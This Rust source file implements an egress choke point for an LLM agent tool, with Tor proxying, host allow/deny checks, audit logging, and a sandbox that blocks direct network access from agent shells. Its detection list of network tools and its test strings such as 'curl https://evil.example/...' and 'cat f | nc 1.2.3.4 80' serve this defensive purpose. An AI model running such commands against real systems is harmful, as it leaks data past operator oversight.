//! Egress policy — the one choke point for LLM-initiated network traffic.
//!
//! Configured by the top-level `[egress]` section (sandbox or base config).
//! **Tor is the default**: `network = "tor"` routes every tool call and every
//! LLM API call through the Tor proxy (`socks5h://127.0.0.1:9050`, i.e. the
//! Arti + lyrebird-rs container from `deploy/tor/`, or `TENGU_TOR_PROXY`).
//! A sandbox that wants the open internet sets `network = "open"`.
//!
//! `install` sets the process-wide policy once the config is resolved; a
//! parent tengu process hands its *resolved* policy to children (`run-agent`,
//! the MCP bridge) via `TENGU_EGRESS`, which wins over the child's own config
//! so the two can't drift. A process that never installs (unit tests) gets
//! the disabled policy: direct connections, no host ceiling, no audit.
//!
//! | Path | Control | Strength |
//! |---|---|---|
//! | `http_request` | proxy + `check_url` on every hop (redirects re-checked) + audit | enforced |
//! | crypto tools (Privy) | proxy (shared tool client) | enforced |
//! | MCP `http` servers | proxy, loopback exempt | enforced |
//! | Telegram Bot API (`tengu telegram`) | teloxide client (reqwest 0.11) via HTTP CONNECT on the proxy port (`http_connect_proxy`), 30s/60s timeouts | enforced |
//! | LLM API (OpenRouter chat, embeddings, wiki compiler) | proxy iff `route_llm_api` (default: on under Tor) | enforced |
//! | `run_command` / shell skills | `guard_shell` URL check + audit; proxy env vars (loopback exempt); `shell_network = "isolated"` runs `sh` under macOS `sandbox-exec` — only the proxy port is reachable | isolated: kernel-enforced; `proxy_env`: advisory |
//! | MCP `stdio` servers | proxy env vars (loopback exempt, like MCP `http`) | advisory |
//! | Claude Code builtin `Bash` | stripped from the profile while a proxy is set (`claude_code_profile`) | enforced |
//! | Claude Code's own API traffic | `HTTPS_PROXY` = HTTP CONNECT on the proxy port (Arti serves CONNECT on 9050) when `route_llm_api` (`claude_cli_env`) | advisory (the CLI honours the env) |
//!
//! Every `http_request` hop and every network-looking shell command is
//! appended to the JSONL audit log (`audit_log`, default
//! `<TENGU_HOME>/logs/egress.jsonl`) and mirrored as a `tengu::egress`
//! tracing line.

use std::io::Write;
use std::net::ToSocketAddrs;
use std::path::PathBuf;
use std::sync::{Arc, RwLock};
use std::time::Duration;

use anyhow::{anyhow, bail, Context, Result};
use once_cell::sync::Lazy;
use reqwest::Url;
use serde_json::Value;

use crate::config::egress::{EgressConfig, SHELL_ISOLATED};
use crate::domain::scope::host_matches;

/// Env var carrying the parent's resolved `EgressConfig` (JSON) to children.
pub(crate) const EGRESS_ENV: &str = "TENGU_EGRESS";

const SANDBOX_EXEC: &str = "/usr/bin/sandbox-exec";

/// Hosts every proxied client leaves direct (loopback only).
const LOOPBACK_NO_PROXY: &str = "localhost,127.0.0.1,::1";

/// Proxy env vars exported to shell children and MCP stdio servers.
const PROXY_ENV_VARS: &[&str] = &[
    "ALL_PROXY",
    "all_proxy",
    "HTTPS_PROXY",
    "https_proxy",
    "HTTP_PROXY",
    "http_proxy",
];

/// Binaries whose presence makes a shell command worth auditing even when
/// it carries no URL literal.
const NETWORK_BINS: &[&str] = &[
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "ftp",
    "git",
    "http",
    "https",
    "aria2c",
    "lynx",
    "w3m",
    "dig",
    "nslookup",
    "host",
    "ping",
    "traceroute",
    "nmap",
];

static URL_RE: Lazy<regex::Regex> =
    Lazy::new(|| regex::Regex::new(r#"(?i)\bhttps?://[^\s'"<>`]+"#).expect("static regex"));

/// Resolved, process-wide egress policy.
pub(crate) struct EgressPolicy {
    cfg: EgressConfig,
    audit_path: Option<PathBuf>,
}

static POLICY: Lazy<RwLock<Arc<EgressPolicy>>> =
    Lazy::new(|| RwLock::new(Arc::new(EgressPolicy::disabled())));

/// Current process-wide policy (disabled until `install`).
pub(crate) fn policy() -> Arc<EgressPolicy> {
    match POLICY.read() {
        Ok(guard) => Arc::clone(&guard),
        Err(poisoned) => Arc::clone(&poisoned.into_inner()),
    }
}

/// Install the process-wide policy. `TENGU_EGRESS` (set by a parent tengu
/// process) wins over `cfg`. Invalid config is an error — callers must not
/// continue with network access on a policy they couldn't apply.
pub(crate) fn install(cfg: &EgressConfig) -> Result<()> {
    let effective = match std::env::var(EGRESS_ENV) {
        Ok(raw) => serde_json::from_str::<EgressConfig>(&raw)
            .with_context(|| format!("{EGRESS_ENV} is not valid [egress] JSON"))?,
        Err(_) => cfg.clone(),
    };
    let policy = EgressPolicy::from_config(effective)?;
    tracing::info!(
        target: "tengu::egress",
        proxy = policy.cfg.proxy.as_deref().unwrap_or("direct"),
        route_llm_api = policy.cfg.route_llm_api,
        allow_hosts = ?policy.cfg.allow_hosts,
        deny_hosts = ?policy.cfg.deny_hosts,
        https_only = policy.cfg.https_only,
        shell_network = %policy.cfg.shell_network,
        audit_log = ?policy.audit_path,
        "egress policy installed"
    );
    let mut guard = POLICY.write().unwrap_or_else(|p| p.into_inner());
    *guard = Arc::new(policy);
    Ok(())
}

impl EgressPolicy {
    fn disabled() -> Self {
        Self {
            cfg: EgressConfig {
                audit: false,
                ..EgressConfig::open().resolved()
            },
            audit_path: None,
        }
    }

    pub(crate) fn from_config(cfg: EgressConfig) -> Result<Self> {
        let errors = cfg.validation_errors();
        if !errors.is_empty() {
            bail!("invalid [egress] config:\n- {}", errors.join("\n- "));
        }
        let cfg = cfg.resolved();
        let audit_path = cfg.audit.then(|| match &cfg.audit_log {
            Some(p) => crate::config::paths::expand_tilde(p),
            None => crate::config::paths::resolve_tengu_home()
                .join("logs")
                .join("egress.jsonl"),
        });
        if let Some(dir) = audit_path.as_ref().and_then(|p| p.parent()) {
            let _ = std::fs::create_dir_all(dir);
        }
        Ok(Self { cfg, audit_path })
    }

    pub(crate) fn config(&self) -> &EgressConfig {
        &self.cfg
    }

    pub(crate) fn proxy(&self) -> Option<&str> {
        self.cfg.proxy.as_deref()
    }

    /// `[egress].network` after resolution (`tor` | `open`).
    pub(crate) fn network(&self) -> &str {
        &self.cfg.network
    }

    pub(crate) fn route_llm_api(&self) -> bool {
        self.cfg.route_llm_api.unwrap_or(false)
    }

    /// Log (don't fail) when the proxy port doesn't accept connections —
    /// under `network = "tor"` every request would error until it does.
    pub(crate) fn warn_if_proxy_unreachable(&self) {
        let Some(addr) = self.proxy_socket_addr() else {
            return;
        };
        // Every resolved address, like reqwest does (`localhost` may resolve
        // to `::1` first while the proxy listens on 127.0.0.1 only).
        let reachable = addr
            .to_socket_addrs()
            .map(|addrs| {
                addrs.into_iter().any(|sa| {
                    std::net::TcpStream::connect_timeout(&sa, Duration::from_secs(1)).is_ok()
                })
            })
            .unwrap_or(false);
        if !reachable {
            tracing::warn!(
                target: "tengu::egress",
                proxy = %addr,
                "egress: network = \"{}\" but the proxy is not reachable — start it with \
                 `make tor` (deploy/tor/) or set `[egress] network = \"open\"`; requests \
                 fail closed until then",
                self.cfg.network
            );
        }
    }

    /// `host:port` of the proxy, for reachability checks.
    pub(crate) fn proxy_socket_addr(&self) -> Option<String> {
        let url = Url::parse(self.proxy()?).ok()?;
        let host = url
            .host_str()?
            .trim_matches(|c| c == '[' || c == ']')
            .to_string();
        Some(format!("{}:{}", host, url.port()?))
    }

    /// `http://host:port` form of the proxy for clients that only speak HTTP
    /// CONNECT (the Claude Code CLI). Arti serves CONNECT on the same port as
    /// SOCKS (`enable_http_connect = true` in `deploy/tor/arti.toml`), so a
    /// `socks5h://` proxy maps to `http://` on the same host:port; an
    /// `http(s)://` proxy is used as-is.
    pub(crate) fn http_connect_proxy(&self) -> Option<String> {
        let raw = self.proxy()?;
        let url = Url::parse(raw).ok()?;
        match url.scheme() {
            "http" | "https" => Some(raw.to_string()),
            // `host_str` keeps the `[...]` of an IPv6 literal, which the URL
            // form needs (unlike `proxy_socket_addr`, which strips it).
            _ => Some(format!("http://{}:{}", url.host_str()?, url.port()?)),
        }
    }

    /// Env for the Claude Code CLI child: its own Anthropic API traffic goes
    /// through the proxy via `HTTPS_PROXY` when `route_llm_api` is set.
    /// Empty otherwise (the CLI then connects directly, like OpenRouter does
    /// when `route_llm_api = false`).
    pub(crate) fn claude_cli_env(&self) -> Vec<(&'static str, String)> {
        if !self.route_llm_api() {
            return Vec::new();
        }
        let Some(proxy) = self.http_connect_proxy() else {
            return Vec::new();
        };
        vec![
            ("HTTPS_PROXY", proxy.clone()),
            ("HTTP_PROXY", proxy),
            ("NO_PROXY", LOOPBACK_NO_PROXY.to_string()),
        ]
    }

    pub(crate) fn audit_path(&self) -> Option<&PathBuf> {
        self.audit_path.as_ref()
    }

    pub(crate) fn is_isolated_shell(&self) -> bool {
        self.cfg.shell_network == SHELL_ISOLATED
    }

    fn via(&self) -> &'static str {
        if self.cfg.proxy.is_some() {
            "proxy"
        } else {
            "direct"
        }
    }

    /// `TENGU_EGRESS` value for a child process, with the audit path
    /// resolved so parent and child append to the same file.
    pub(crate) fn child_env(&self) -> String {
        let mut cfg = self.cfg.clone();
        cfg.audit_log = self.audit_path.clone();
        serde_json::to_string(&cfg).unwrap_or_default()
    }

    pub(crate) fn check_host(&self, host: &str) -> Result<()> {
        if let Some(p) = self.cfg.deny_hosts.iter().find(|p| host_matches(p, host)) {
            bail!("egress: host '{host}' matches deny_hosts pattern '{p}'");
        }
        if !self.cfg.allow_hosts.is_empty()
            && !self.cfg.allow_hosts.iter().any(|p| host_matches(p, host))
        {
            bail!(
                "egress: host '{host}' not in allow_hosts {:?}",
                self.cfg.allow_hosts
            );
        }
        Ok(())
    }

    /// Scheme (http/https, `https_only`) + host ceiling.
    pub(crate) fn check_url(&self, url: &Url) -> Result<()> {
        match url.scheme() {
            "https" => {}
            "http" if self.cfg.https_only => {
                bail!("egress: plain http:// refused (https_only) for '{url}'")
            }
            "http" => {}
            other => bail!("egress: scheme '{other}' refused for '{url}' (http/https only)"),
        }
        let host = url
            .host_str()
            .filter(|h| !h.is_empty())
            .ok_or_else(|| anyhow!("egress: url '{url}' has no host"))?;
        self.check_host(host)
    }

    fn apply_proxy(
        &self,
        builder: reqwest::ClientBuilder,
        exempt_loopback: bool,
    ) -> Result<reqwest::ClientBuilder> {
        let Some(raw) = self.proxy() else {
            return Ok(builder);
        };
        let mut proxy =
            reqwest::Proxy::all(raw).with_context(|| format!("egress proxy '{raw}'"))?;
        if exempt_loopback {
            proxy = proxy.no_proxy(reqwest::NoProxy::from_string(LOOPBACK_NO_PROXY));
        }
        // `.proxy()` also turns off reqwest's env-var proxy detection, so the
        // configured proxy is the only route.
        Ok(builder.proxy(proxy))
    }

    /// Client for tool traffic (`http_request`, crypto). Redirects are NOT
    /// followed — `http_request` follows them itself so every hop is checked.
    pub(crate) fn tool_client(&self, timeout: Duration) -> Result<reqwest::Client> {
        let builder = reqwest::Client::builder()
            .timeout(timeout)
            .redirect(reqwest::redirect::Policy::none());
        self.apply_proxy(builder, false)?
            .build()
            .context("egress: build tool http client")
    }

    /// Client builder for LLM provider traffic; proxied iff `route_llm_api`.
    pub(crate) fn llm_api_client(
        &self,
        builder: reqwest::ClientBuilder,
    ) -> Result<reqwest::Client> {
        let builder = if self.route_llm_api() {
            self.apply_proxy(builder, false)?
        } else {
            builder
        };
        builder.build().context("egress: build LLM API http client")
    }

    /// Client for operator-configured MCP `http` servers. Proxied; loopback
    /// servers stay reachable.
    pub(crate) fn mcp_client(&self, builder: reqwest::ClientBuilder) -> Result<reqwest::Client> {
        self.apply_proxy(builder, true)?
            .build()
            .context("egress: build MCP http client")
    }

    /// Proxy env for child processes (shells, MCP stdio servers). Empty when
    /// no proxy is configured. Loopback stays direct — the same exemption
    /// `mcp_client` applies — so a local DB / API next to tengu keeps working.
    pub(crate) fn proxy_env(&self) -> Vec<(&'static str, String)> {
        let Some(proxy) = self.proxy() else {
            return Vec::new();
        };
        PROXY_ENV_VARS
            .iter()
            .map(|k| (*k, proxy.to_string()))
            .chain([
                ("NO_PROXY", LOOPBACK_NO_PROXY.to_string()),
                ("no_proxy", LOOPBACK_NO_PROXY.to_string()),
            ])
            .collect()
    }

    /// `sh -c <command>` with proxy env; under `shell_network = "isolated"`
    /// wrapped in `sandbox-exec` so the kernel refuses every outbound
    /// connection except the proxy port (DNS included).
    pub(crate) fn shell_command(&self, command: &str) -> std::process::Command {
        let mut cmd = if self.is_isolated_shell() {
            let mut c = std::process::Command::new(SANDBOX_EXEC);
            c.arg("-p")
                .arg(self.sandbox_profile())
                .arg("/bin/sh")
                .arg("-c")
                .arg(command);
            c
        } else {
            let mut c = std::process::Command::new("sh");
            c.arg("-c").arg(command);
            c
        };
        for (k, v) in self.proxy_env() {
            cmd.env(k, v);
        }
        cmd
    }

    fn sandbox_profile(&self) -> String {
        let mut profile = String::from("(version 1)\n(allow default)\n(deny network-outbound)\n");
        if let Some(port) = self
            .proxy()
            .and_then(|p| Url::parse(p).ok())
            .and_then(|u| u.port())
        {
            profile.push_str(&format!(
                "(allow network-outbound (remote ip \"localhost:{port}\"))\n"
            ));
        }
        profile
    }

    /// Claude Code builtin profile to actually launch. The builtin `Bash`
    /// has no egress control, so `editor_shell` drops to `editor` while a
    /// proxy is set. The CLI's own API traffic follows `claude_cli_env`.
    #[cfg_attr(not(feature = "claude_code"), allow(dead_code))]
    pub(crate) fn claude_code_profile<'a>(&self, requested: &'a str) -> &'a str {
        if self.proxy().is_some() && requested == "editor_shell" {
            tracing::warn!(
                target: "tengu::egress",
                "claude_code builtin Bash bypasses [egress].proxy — launching with profile 'editor'"
            );
            return "editor";
        }
        requested
    }

    /// Best-effort pre-flight for shell commands: every `http(s)://` literal
    /// must pass `check_url`. A denial is audited here; an allowed command
    /// with a URL or a network binary is audited by `ShellAudit::finish`
    /// once its outcome is known. Obfuscated URLs slip past this —
    /// `shell_network = "isolated"` is the hard control.
    pub(crate) fn guard_shell(self: &Arc<Self>, tool: &str, command: &str) -> Result<ShellAudit> {
        let urls = extract_urls(command);
        if urls.is_empty() && !mentions_network_bin(command) {
            return Ok(ShellAudit { pending: None });
        }
        let event = serde_json::json!({
            "tool": tool,
            "command": command,
            "urls": urls,
            "shell_network": self.cfg.shell_network,
        });
        let verdict = urls.iter().try_for_each(|raw| {
            let url = Url::parse(raw).map_err(|e| anyhow!("egress: bad url '{raw}': {e}"))?;
            self.check_url(&url)
        });
        if let Err(e) = verdict {
            let mut event = event;
            event["verdict"] = "denied".into();
            event["reason"] = format!("{e:#}").into();
            self.audit(event);
            return Err(e);
        }
        Ok(ShellAudit {
            pending: Some((Arc::clone(self), event)),
        })
    }

    /// Append one audit record (JSONL) and mirror it to tracing. Adds
    /// `ts`, `pid`, `session`, `agent`, `via`, `proxy`. Fail-soft on I/O.
    pub(crate) fn audit(&self, mut event: Value) {
        let Some(path) = &self.audit_path else {
            return;
        };
        if let Value::Object(map) = &mut event {
            map.insert("ts".into(), chrono::Utc::now().to_rfc3339().into());
            map.insert("pid".into(), std::process::id().into());
            map.insert(
                "session".into(),
                std::env::var("TENGU_SESSION_ID").ok().into(),
            );
            map.entry("agent")
                .or_insert_with(|| std::env::var("TENGU_AGENT_NAME").ok().into());
            map.insert("via".into(), self.via().into());
            map.insert("proxy".into(), self.cfg.proxy.clone().into());
        }
        let line = event.to_string();
        tracing::info!(target: "tengu::egress", "{line}");
        let written = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(path)
            .and_then(|mut f| f.write_all(format!("{line}\n").as_bytes()));
        if let Err(e) = written {
            tracing::warn!(target: "tengu::egress", path = %path.display(), error = %e, "egress audit write failed");
        }
    }
}

/// Audit record for a shell command that passed `guard_shell`, written
/// with its outcome (a sandbox refusal shows up as `verdict = "error"`).
pub(crate) struct ShellAudit {
    pending: Option<(Arc<EgressPolicy>, Value)>,
}

impl ShellAudit {
    pub(crate) fn finish<T>(self, outcome: &Result<T>) {
        let Some((policy, mut event)) = self.pending else {
            return;
        };
        match outcome {
            Ok(_) => event["verdict"] = "allowed".into(),
            Err(e) => {
                event["verdict"] = "error".into();
                event["reason"] = format!("{e:#}").into();
            }
        }
        policy.audit(event);
    }
}

fn extract_urls(command: &str) -> Vec<String> {
    URL_RE
        .find_iter(command)
        .map(|m| {
            m.as_str()
                .trim_end_matches([')', ']', ',', ';', '.', '\\'])
                .to_string()
        })
        .collect()
}

fn mentions_network_bin(command: &str) -> bool {
    command
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | '(' | ')' | '`'))
        .filter_map(|tok| tok.rsplit('/').next())
        .any(|tok| NETWORK_BINS.contains(&tok))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::egress::{DEFAULT_TOR_PROXY, NETWORK_OPEN, NETWORK_TOR};

    fn policy_with(cfg: EgressConfig) -> Arc<EgressPolicy> {
        Arc::new(EgressPolicy {
            cfg: cfg.resolved(),
            audit_path: None,
        })
    }

    fn open_with(f: impl FnOnce(&mut EgressConfig)) -> EgressConfig {
        let mut cfg = EgressConfig::open();
        f(&mut cfg);
        cfg
    }

    #[test]
    fn default_is_tor_with_llm_api_routed() {
        let cfg = EgressConfig::default();
        assert!(cfg.validation_errors().is_empty());
        let p = policy_with(cfg);
        assert_eq!(p.network(), NETWORK_TOR);
        assert_eq!(p.proxy(), Some(DEFAULT_TOR_PROXY));
        assert!(p.route_llm_api());
        assert!(!p.proxy_env().is_empty());
        assert_eq!(p.proxy_socket_addr().as_deref(), Some("127.0.0.1:9050"));
        // Empty TOML section == default: Tor.
        let parsed: EgressConfig = toml::from_str("").unwrap();
        assert!(parsed.is_tor());
    }

    #[test]
    fn open_network_is_direct_and_permissive() {
        let cfg = EgressConfig::open();
        assert!(cfg.validation_errors().is_empty());
        let p = policy_with(cfg);
        assert_eq!(p.network(), NETWORK_OPEN);
        assert_eq!(p.proxy(), None);
        assert!(!p.route_llm_api());
        assert!(p.proxy_env().is_empty());
        assert!(p.claude_cli_env().is_empty());
        assert!(p
            .check_url(&Url::parse("http://anything.example/x").unwrap())
            .is_ok());
        let parsed: EgressConfig = toml::from_str("network = \"open\"").unwrap();
        assert!(!parsed.is_tor());
    }

    #[test]
    fn explicit_values_win_over_network_defaults() {
        // tor + explicit proxy + LLM API direct
        let p = policy_with(EgressConfig {
            proxy: Some("socks5h://10.0.0.5:9050".into()),
            route_llm_api: Some(false),
            ..EgressConfig::default()
        });
        assert_eq!(p.proxy(), Some("socks5h://10.0.0.5:9050"));
        assert!(!p.route_llm_api());
        // open + explicit (non-Tor) proxy
        let p = policy_with(open_with(|c| {
            c.proxy = Some("http://proxy.corp:3128".into())
        }));
        assert_eq!(p.proxy(), Some("http://proxy.corp:3128"));
        assert!(!p.route_llm_api());
    }

    #[test]
    fn resolved_config_round_trips_through_child_env() {
        let p = policy_with(EgressConfig::default());
        let child: EgressConfig = serde_json::from_str(&p.child_env()).unwrap();
        assert_eq!(child.proxy.as_deref(), Some(DEFAULT_TOR_PROXY));
        assert_eq!(child.route_llm_api, Some(true));
        assert_eq!(child.resolved(), child);
    }

    #[test]
    fn unknown_network_is_rejected() {
        let cfg = EgressConfig {
            network: "vpn".into(),
            ..EgressConfig::default()
        };
        assert!(cfg.validation_errors()[0].contains("egress.network"));
    }

    #[test]
    fn claude_cli_env_maps_socks_proxy_to_http_connect() {
        let p = policy_with(EgressConfig::default());
        let env = p.claude_cli_env();
        assert!(env
            .iter()
            .any(|(k, v)| *k == "HTTPS_PROXY" && v == "http://127.0.0.1:9050"));
        assert!(env.iter().any(|(k, _)| *k == "NO_PROXY"));
        let http = policy_with(open_with(|c| {
            c.proxy = Some("http://tor:9050".into());
            c.route_llm_api = Some(true);
        }));
        assert_eq!(
            http.http_connect_proxy().as_deref(),
            Some("http://tor:9050")
        );
        let direct_llm = policy_with(EgressConfig {
            route_llm_api: Some(false),
            ..EgressConfig::default()
        });
        assert!(direct_llm.claude_cli_env().is_empty());
    }

    #[test]
    fn proxy_validation_rejects_dns_leaking_and_portless() {
        let bad = |proxy: &str| open_with(|c| c.proxy = Some(proxy.into()));
        assert!(bad("socks5h://127.0.0.1:9050")
            .validation_errors()
            .is_empty());
        assert!(bad("socks5://127.0.0.1:9050").validation_errors()[0].contains("DNS leak"));
        assert!(bad("socks5h://127.0.0.1").validation_errors()[0].contains("explicit port"));
        assert!(bad("ftp://127.0.0.1:21").validation_errors()[0].contains("unsupported"));
    }

    #[test]
    fn route_llm_api_requires_proxy() {
        let cfg = open_with(|c| c.route_llm_api = Some(true));
        assert!(cfg.validation_errors()[0].contains("needs egress.proxy"));
    }

    #[test]
    fn unknown_field_is_a_parse_error() {
        let err = toml::from_str::<EgressConfig>("allowed_hosts = [\"a.com\"]").unwrap_err();
        assert!(err.to_string().contains("allowed_hosts"), "{err}");
    }

    #[test]
    fn host_ceiling_deny_wins_then_allow_list() {
        let p = policy_with(open_with(|c| {
            c.allow_hosts = vec!["*.wikipedia.org".into(), "api.coingecko.com".into()];
            c.deny_hosts = vec!["evil.wikipedia.org".into()];
        }));
        assert!(p.check_host("en.wikipedia.org").is_ok());
        assert!(p.check_host("api.coingecko.com").is_ok());
        assert!(p.check_host("evil.wikipedia.org").is_err());
        assert!(p.check_host("example.com").is_err());
    }

    #[test]
    fn check_url_enforces_scheme_and_https_only() {
        let p = policy_with(open_with(|c| c.https_only = true));
        assert!(p.check_url(&Url::parse("https://a.com").unwrap()).is_ok());
        assert!(p.check_url(&Url::parse("http://a.com").unwrap()).is_err());
        assert!(p.check_url(&Url::parse("ftp://a.com").unwrap()).is_err());
    }

    #[test]
    fn proxy_env_exports_all_variants_and_exempts_loopback() {
        let p = policy_with(EgressConfig::default());
        let env = p.proxy_env();
        for k in PROXY_ENV_VARS {
            assert!(env
                .iter()
                .any(|(n, v)| n == k && v == "socks5h://127.0.0.1:9050"));
        }
        assert!(env
            .iter()
            .any(|(n, v)| *n == "NO_PROXY" && v == LOOPBACK_NO_PROXY));
    }

    #[test]
    fn http_connect_proxy_keeps_ipv6_brackets() {
        let p = policy_with(EgressConfig {
            proxy: Some("socks5h://[::1]:9050".into()),
            ..EgressConfig::default()
        });
        assert_eq!(p.http_connect_proxy().as_deref(), Some("http://[::1]:9050"));
        assert!(Url::parse(&p.http_connect_proxy().unwrap()).is_ok());
        assert_eq!(p.proxy_socket_addr().as_deref(), Some("::1:9050"));
    }

    #[test]
    fn guard_shell_blocks_disallowed_url_literals() {
        let p = policy_with(open_with(|c| c.allow_hosts = vec!["api.github.com".into()]));
        assert!(p.guard_shell("run_command", "ls -la").is_ok());
        assert!(p
            .guard_shell("run_command", "curl -s https://api.github.com/repos")
            .is_ok());
        let Err(err) = p.guard_shell("run_command", "echo hi; curl 'https://evil.example/x?a=1'")
        else {
            panic!("expected guard_shell denial");
        };
        assert!(err.to_string().contains("evil.example"), "{err}");
    }

    #[test]
    fn network_bin_detection_handles_paths_and_pipes() {
        assert!(mentions_network_bin("/usr/bin/curl -s x"));
        assert!(mentions_network_bin("cat f | nc 1.2.3.4 80"));
        assert!(!mentions_network_bin("ls -la && echo curling"));
    }

    #[test]
    fn claude_code_profile_drops_bash_under_proxy() {
        let direct = policy_with(EgressConfig::open());
        assert_eq!(direct.claude_code_profile("editor_shell"), "editor_shell");
        let proxied = policy_with(EgressConfig::default());
        assert_eq!(proxied.claude_code_profile("editor_shell"), "editor");
        assert_eq!(proxied.claude_code_profile("read_only"), "read_only");
    }

    #[test]
    fn sandbox_profile_allows_only_proxy_port() {
        let p = policy_with(EgressConfig {
            shell_network: SHELL_ISOLATED.into(),
            ..EgressConfig::default()
        });
        let profile = p.sandbox_profile();
        assert!(profile.contains("(deny network-outbound)"));
        assert!(profile.contains("localhost:9050"));
        let no_proxy = policy_with(open_with(|c| c.shell_network = SHELL_ISOLATED.into()));
        assert!(!no_proxy
            .sandbox_profile()
            .contains("allow network-outbound"));
    }

    /// Kernel-level check: under `isolated`, a direct connection is refused
    /// while the shell itself still runs.
    #[cfg(target_os = "macos")]
    #[test]
    fn isolated_shell_blocks_direct_network() {
        let p = policy_with(open_with(|c| c.shell_network = SHELL_ISOLATED.into()));
        let out = p
            .shell_command(
                "echo alive; /usr/bin/nc -z -G 2 1.1.1.1 443 && echo LEAK || echo BLOCKED",
            )
            .output()
            .unwrap();
        let stdout = String::from_utf8_lossy(&out.stdout);
        assert!(stdout.contains("alive"), "{stdout}");
        assert!(stdout.contains("BLOCKED"), "{stdout}");
    }
}
